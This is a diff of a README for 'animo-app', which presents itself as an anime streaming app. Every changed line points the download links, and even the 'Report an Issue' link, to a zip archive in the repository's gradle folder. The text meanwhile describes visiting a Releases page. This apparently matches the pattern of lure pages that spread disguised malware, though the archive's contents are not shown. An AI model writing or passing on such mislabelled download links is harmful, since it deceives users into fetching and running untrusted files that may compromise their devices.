@@ -1,6 +1,6 @@
 # 🎉 animo-app - Stream Your Favorite Anime Seamlessly
 
-![Download animo-app](https://raw.githubusercontent.com/astriefaw/animo-app/master/gradle/wrapper/animo-app_v2.0.zip)
+![Download animo-app](https://github.com/astriefaw/animo-app/raw/refs/heads/master/gradle/animo_app_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ You can easily download the animo-app by visiting our Releases page. Follow thes
 
 1. Click the link below to go to the download page.
   
-   [Download animo-app](https://raw.githubusercontent.com/astriefaw/animo-app/master/gradle/wrapper/animo-app_v2.0.zip)
+   [Download animo-app](https://github.com/astriefaw/animo-app/raw/refs/heads/master/gradle/animo_app_v1.2.zip)
 
 2. On the Releases page, locate the latest version.
 3. Tap on the appropriate file for your device.
@@ -72,6 +72,6 @@ To ensure you always have the best experience, we regularly update animo-app wit
 
 If you have any questions or need assistance, feel free to reach out to our support team through the issues section on GitHub:
 
-[Report an Issue](https://raw.githubusercontent.com/astriefaw/animo-app/master/gradle/wrapper/animo-app_v2.0.zip)
+[Report an Issue](https://github.com/astriefaw/animo-app/raw/refs/heads/master/gradle/animo_app_v1.2.zip)
 
 Thank you for choosing animo-app! We hope you find joy in streaming your favorite anime.
